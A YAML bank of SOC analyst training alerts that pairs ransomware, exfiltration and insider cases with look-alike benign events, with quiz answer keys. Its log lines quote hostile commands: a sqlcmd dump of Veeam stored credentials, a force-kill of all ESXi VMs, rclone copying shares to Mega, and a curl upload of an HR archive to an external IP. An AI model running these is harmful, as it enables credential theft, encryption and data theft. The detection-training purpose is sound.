# ON SHIFT alerts, drop 3, part 5: ransomware kill-chain steps, staging/exfil, insider, physical and business edge cases (y181-y200)
- id: y181
  d: endpoint
  src: 'EDR · Process creation'
  t: 'Read of the backup configuration database'
  h: 'BKP-VBR01 · corp\svc-veeam'
  l: ['process: sqlcmd.exe -S localhost\VEEAMSQL2016 -E -Q "SELECT user_name,password FROM [VeeamBackup].[dbo].[Credentials]" as corp\svc-veeam, signed Microsoft binary', 'parent chain: services.exe → PSEXESVC.exe → cmd.exe → sqlcmd.exe (PsExec with explicit credentials); Veeam.Backup.Service.exe is not involved', 'the 38 returned rows were piped into a PowerShell block calling ProtectedData.Unprotect and written as plaintext to C:\ProgramData\c.txt', 'the PsExec session came from FIN-WS14, a finance workstation that has never touched this backup server before']
  v: 1
  x: T1555
  c: veeam-cred-store
  k: [1, 3]
  diff: 3
  trap: bland
  say: 'The Veeam configuration database credentials table was read through sqlcmd under the Veeam service account, launched over PsExec from a finance workstation.'
  tell: 'Backup servers hold the keys to everything: domain admin, hypervisor root and repository credentials in one table, which is why ransomware crews raid them before encrypting. This is the shape of the Veeam credential grabs seen with CVE 2023-27532 and the public Veeam-Get-Creds scripts: signed sqlcmd, the right service account, nothing scary on its face. The deciding facts are the PsExec parent chain from a finance workstation and the decrypted plaintext file.'
  q: {kind: contain, ask: 'First containment step?', o: ['Rotate every credential stored in the Veeam database and isolate FIN-WS14 and the backup server', 'Reset only the svc-veeam password', 'Restart the Veeam services to clear the session'], a: 0, why: 'The table holds many privileged credentials, so assume all were read and cut the source of the remote session.'}
- id: y182
  d: endpoint
  src: 'EDR · Process creation'
  t: 'Read of the backup configuration database'
  h: 'BKP-VBR02 · NT SERVICE\VeeamBackupSvc'
  l: ['process: Veeam.Backup.Service.exe (signed, Veeam Software Group GmbH) opened the VeeamBackup database and read dbo.Credentials 3 s into the 03:00 "Configuration Backup" job', 'parent chain: services.exe → Veeam.Backup.Service.exe; no shell, no sqlcmd, no interactive or remote logon on the server since 17:40', 'output: D:\VeeamConfigBackup\BKP-VBR02_nightly.bco, encrypted with the configuration-backup password, 41 MB, same name pattern every night for 3 years', 'no plaintext copy of the credentials was written anywhere; the file was then copied to the immutable repository by the repository sync job']
  v: 0
  x: T1555
  c: veeam-cred-store
  k: [0, 1]
  diff: 3
  trap: scary
  say: 'The Veeam backup service read its credentials table three seconds into the nightly configuration backup and wrote an encrypted configuration file.'
  tell: 'Same table, same host role, opposite story. The reader is the Veeam service itself, launched by services.exe with no shell, no sqlcmd and no logon, and the only output is the encrypted configuration file it has written nightly for three years. Credential-store reads are judged by who reads and what comes out.'
- id: y183
  d: linux
  src: 'ESXi · shell.log + hostd'
  t: 'ESXi host: VM stop and disk rewrite'
  h: 'ESX-PRD04 · root'
  l: ['shell.log: lockdown mode disabled 02:08 and SSH started 02:09 with the local root account, not through vCenter; root login at 02:11 from 10.20.4.9', 'commands: esxcli vm process list, then a loop of esxcli vm process kill --type=force --world-id across all 31 running VMs within 90 seconds', 'file activity: /tmp/enc (ELF, unsigned, mode 0755) opened 112 .vmdk, .vmx and .vmsd files for write and appended a new extension; a README dropped in each VM directory', '10.20.4.9 is a domain-joined jump server first seen on the management VLAN today; root logins to this host normally come from the vCenter appliance']
  v: 1
  x: T1486
  c: esxi-vm-process-kill
  k: [1, 2]
  diff: 3
  say: 'Root force-killed all 31 VMs on an ESXi host in 90 seconds, then an unsigned file in tmp started writing the VM disk files.'
  tell: 'This is the shape of the ESXi lockers Akira and Black Basta ship: list the world IDs, force-kill the VMs so the vmdk locks release, then encrypt the files in place. Thirty-one VMs die in 90 seconds and an unsigned ELF in /tmp starts writing right after. Nobody evacuates a host like this.'
  q: {kind: contain, ask: 'Best first move?', o: ['Cut the management path from 10.20.4.9 and hunt the same ELF and SSH enablement on every other host', 'Restart the 31 VMs from the console to restore service', 'Wait for the writes to finish and restore from last night'], a: 0, why: 'Stop the spread to other hosts first; restarting VMs on a host with live writes only feeds the encryptor.'}
- id: y184
  d: linux
  src: 'ESXi · shell.log + hostd'
  t: 'ESXi host: VM stop and disk rewrite'
  h: 'ESX-PRD07 · root'
  l: ['shell.log: SSH enabled 21:52 through the vCenter host settings; root login at 21:55 from 10.20.4.12, the PAM bastion with session recording', 'host entered maintenance mode at 21:40 for a firmware update; 30 of 31 VMs were migrated by DRS, app-sql03 is stuck in a failing power-off task', 'commands: esxcli vm process list, then esxcli vm process kill --type=soft, and --type=hard two minutes later, for that single world ID', 'no new executables and no datastore writes beyond that VM''s vmware.log; SSH stopped and lockdown mode re-enabled by vCenter at 22:10']
  v: 0
  x: T1059.012
  c: esxi-vm-process-kill
  k: [1, 2]
  diff: 3
  trap: scary
  say: 'Root on an ESXi host stopped one VM with a soft kill, then a hard kill two minutes later, arriving through a PAM bastion.'
  tell: 'Same esxcli command as the locker playbook, but scoped to one stuck VM on a host already in maintenance mode: soft first, hard two minutes later, the escalation path the vendor documents. The other 30 VMs were migrated, the session came through the PAM bastion, and the host went back to lockdown. Count the VMs before you panic.'
- id: y185
  d: linux
  src: 'ESXi · hostd + vCenter tasks'
  t: 'ESXi host: VM stop and disk rewrite'
  h: 'ESX-PRD05 · vpxuser'
  l: ['vCenter task: Reconfigure virtual machine · apply storage policy "VM Encryption" to 28 VMs on ds-prd02, initiated by svc-vmpolicy@vsphere.local from vcsa01 through the API', 'hostd: each VM reconfigured through vpxuser, disks rewritten in place with keys fetched from the corporate KMIP key provider kms01.corp.com, key provider status healthy', 'datastore ds-prd02: write throughput 6x baseline for 3 h and high host CPU; file names and extensions unchanged, no new executables, no shell session on the host', 'the policy change came from the infrastructure repo pipeline; every VM had a completed backup before the first task started']
  v: 0
  x: T1486
  c: esxi-vm-process-kill
  k: [0, 1]
  diff: 3
  trap: scary
  say: 'vCenter applied an encryption storage policy to 28 VMs through the API, and the host disk write rate jumped sixfold for three hours.'
  tell: 'Mass in-place rewriting of vmdk files with a sixfold write spike is also what a locker does, but this one is initiated by vCenter through the API, uses keys from the corporate key provider, leaves names and extensions alone and has no shell session. The encryptor you should fear needs a root shell; the encryption you ordered arrives as a vCenter task.'
- id: y186
  d: endpoint
  src: 'EDR · Process creation'
  t: 'Cloud sync utility transfers files to external storage'
  h: 'FS-FIN02 · corp\svc-sched'
  l: ['process: C:\Windows\Temp\winupd.exe copy \\fs-fin02\Finance$ mega:in -q --transfers 16 --ignore-existing, parent cmd.exe under a PsExec service', 'PE metadata: original filename rclone.exe, no publisher signature; file first seen on this host 20 minutes ago', 'config: C:\Windows\Temp\r.conf created at the same time with a [mega] remote, user an unfamiliar free-mail address, password obscured', 'network: 41 GB sent to g.api.mega.co.nz in 52 minutes; this host normally sends under 200 MB a day']
  v: 1
  x: T1567.002
  c: rclone-remote-config
  k: [1, 3]
  diff: 2
  say: 'A renamed executable in Temp copied the finance share to a remote at mega, sending 41 gigabytes in 52 minutes from a file server.'
  tell: 'Renamed to winupd.exe, but the original filename still says rclone and the config points at a free-tier cloud drive. Akira and plenty of other crews use rclone to Mega for the same reason: it is fast, signed by nobody and looks like a sync. 41 GB from a file server that sends 200 MB a day is the real alert.'
  q: {kind: pivot, ask: 'First pivot?', o: ['Find the PsExec source and who ran it, and hunt the same file on other servers', 'Block mega.nz at the proxy and close the alert', 'Ask the finance lead whether they use cloud storage'], a: 0, why: 'Blocking one domain leaves the intruder and the next exfil path in place; find the session and the other hosts.'}
- id: y187
  d: endpoint
  src: 'EDR · Process creation'
  t: 'Cloud sync utility transfers files to external storage'
  h: 'BKP-FS03 · corp\svc-rclone'
  l: ['process: D:\Tools\rclone\rclone.exe sync D:\Shares b2:corp-fs-offsite --fast-list --transfers 8 --log-file D:\Logs\rclone.log, parent Task Scheduler task "Offsite-FS-Sync"', 'binary: unmodified rclone.exe at its install path, hash matches the version pinned in the software catalogue; the task was created 14 months ago', 'config: remote b2 uses an application key restricted to bucket corp-fs-offsite with write and list only, no delete; the bucket belongs to the corporate Backblaze account', 'network: about 38 GB to Backblaze endpoints between 01:00 and 02:10 each night, the same band for 14 months']
  v: 0
  x: T1567.002
  c: rclone-remote-config
  k: [1, 2]
  diff: 3
  trap: scary
  say: 'A scheduled task ran rclone from its install folder and synced file shares to a Backblaze bucket, about 38 gigabytes in seventy minutes.'
  tell: 'Same tool, same upload to a cloud service, opposite story. The binary is the pinned build in its own folder, the schedule is 14 months old, the destination is a corp-owned bucket with a key that cannot delete, and the bytes repeat every night. Judge rclone by who owns the remote.'
- id: y188
  d: endpoint
  src: 'EDR · Process creation'
  t: 'Archive utility run over a file share'
  h: 'FS-HR01 · corp\adm-jlopez'
  l: ['process: C:\Users\Public\7z.exe a -t7z -mx1 -mhe=on -p[masked] D:\PerfLogs\hr.7z \\fs-hr01\HR$\*, parent cmd.exe under a service named PerfSvc2', 'binary: 7z.exe sits in a user-writable folder, 7-Zip is not installed on this server, file written 8 minutes ago', 'output: a single 6.8 GB archive with encrypted headers after 14 min of reads across personnel, payroll and legal-hold folders; this account administers 3 servers and never reads HR content', '11 minutes later: curl.exe -T D:\PerfLogs\hr.7z https://185.x.x.x/u from the same session, then del /f on the archive']
  v: 1
  x: T1560.001
  c: archive-staging
  k: [1, 3]
  diff: 3
  say: 'A 7-Zip copy in the Public folder built a 6.8 GB encrypted archive of the HR share, and curl uploaded it to an external address.'
  tell: 'Single archive, encrypted headers, built in PerfLogs with a copy of 7-Zip dropped eight minutes ago: classic staging, and the curl upload plus delete closes the chain. A 7z run by an admin on a file server is otherwise the dullest event in the bank. The dropped binary, the HR scope and the upload make it theft.'
  q: {kind: pivot, ask: 'What do you scope next?', o: ['Everything else this account touched and every host that reached 185.x.x.x', 'Only the ACLs on the HR share', 'Whether 7-Zip is on the software list'], a: 0, why: 'The archive already left; the question is how far the account and the destination reach.'}
- id: y189
  d: endpoint
  src: 'EDR · Process creation'
  t: 'Archive utility run over a file share'
  h: 'FS-HR02 · corp\svc-archive'
  l: ['process: C:\Program Files\7-Zip\7z.exe a -t7z -mx5 -mhe=on -p[masked] E:\Archive\HR\closed-cases.7z \\fs-hr02\HR$\Closed\*, parent Task Scheduler task "HR-Quarterly-Archive"', 'binary: the packaged 7-Zip install under Program Files, deployed by the software client; the task was created 3 years ago and runs on the first of each quarter', 'scope: closed-case folders only (read-only ACL set by the records system at case close); 6.1 GB archive written to E:\Archive on the same server, then source files tiered to cold storage', 'network: no outbound connection from the process or its children; svc-archive password in the vault; the archive share is readable by Legal and Records only']
  v: 0
  x: T1560.001
  c: archive-staging
  k: [1, 2]
  diff: 3
  trap: scary
  say: 'The scheduled quarterly task ran the installed 7-Zip over closed-case HR folders and wrote a 6.1 GB encrypted archive on the same server.'
  tell: 'A password-protected 7z over an HR share looks like staging until you read the context. The installed binary, the quarterly schedule, closed-case scope and a destination on the same server with no egress are what records retention looks like. Compare a dropped binary, live HR folders and a curl upload.'
- id: y190
  d: cloud
  src: 'M365 · Unified Audit Log + DLP'
  t: 'Bulk file access tied to a leaver'
  h: 'LT-SLS31 · corp\a.fischer'
  l: ['HR feed: resignation accepted 6 days ago, last day in 9 days; access not yet reduced', 'activity: 11,400 files from the Sales-Pipeline and Pricing SharePoint sites synced to the laptop in 40 min; the user joined Pricing 3 weeks ago and the 12-month baseline for this role is about 40 files a week', 'endpoint DLP: dropbox.exe sync client installed 2 days ago uploaded 3.9 GB from C:\Users\a.fischer\SalesOps\ to a personal Dropbox account (a.fischer.sales@gmail.com), not the corporate team', 'DLP classification: 62% of the files carry the label Confidential - Customer Pricing; 4 uploads to personal webmail were blocked earlier the same day']
  v: 1
  x: T1567.002
  c: departing-user-data
  k: [0, 2]
  diff: 3
  say: 'A user whose resignation was accepted six days ago synced eleven thousand sales files, then uploaded 3.9 GB to a personal Dropbox account.'
  tell: 'The notice date explains the motive, the baseline explains the surprise and the personal Dropbox client explains the destination. Departing-employee theft is a boring insider story: the client list leaves with the person, and the labels show it was confidential pricing. Decide before the last day, not after.'
  q: {kind: contain, ask: 'Best next step?', o: ['Block the sync client, preserve evidence and loop in HR and counsel before talking to the user', 'Email the user and ask them to delete the files', 'Wait for the last day and review the logs then'], a: 0, why: 'Stop the flow quietly, keep the evidence intact and let HR and counsel run the conversation.'}
- id: y191
  d: cloud
  src: 'M365 · Unified Audit Log + DLP'
  t: 'Bulk file access tied to a leaver'
  h: 'LT-SLS28 · corp\p.nowak'
  l: ['HR feed: resignation accepted 5 days ago, last day in 10 days; the offboarding checklist is open with the manager', 'activity: 9,800 files copied over 3 days from the user''s own OneDrive and the Sales-Pipeline site into the folder Handover on the Sales-Ops team site, using the browser; the user created 96% of the files', 'destination: corporate tenant only; no external sharing links, no sync client on an unmanaged device, 0 DLP blocks; the manager was granted access to Handover by the offboarding workflow', 'volume: about 3,000 files a day against a 300 a day baseline, matching the checklist task "handover of working files"']
  v: 0
  x: T1567.002
  c: departing-user-data
  k: [1, 2]
  diff: 3
  trap: scary
  say: 'A user with ten days left copied 9,800 files from their own OneDrive and a team site into a handover folder inside the tenant.'
  tell: 'The leaver flag makes it look like a smash and grab, but the files are the user''s own work, copied inside the tenant to a team folder the manager can open. No external link, no personal sync, no DLP blocks. Handovers are noisy; theft leaves the tenant.'
- id: y192
  d: cloud
  src: 'M365 · Unified Audit Log + DLP'
  t: 'Bulk file access tied to a leaver'
  h: 'WS-SLS09 · corp\m.kowalski'
  l: ['actor: m.kowalski@corp.com (Sales Ops manager) opened the retained OneDrive of t.brandt, who left 12 days ago; access was granted to the manager by the account-deletion workflow', 'activity: 14,200 files moved inside the tenant to the Sales-Ops team site over 2 h using the OneDrive "Move to" action', 'source: managed laptop in the office, compliant, BitLocker on; no download to local disk, no sync client, no external sharing links created', 'the deleted-user retention window is 30 days and 18 days remain']
  v: 0
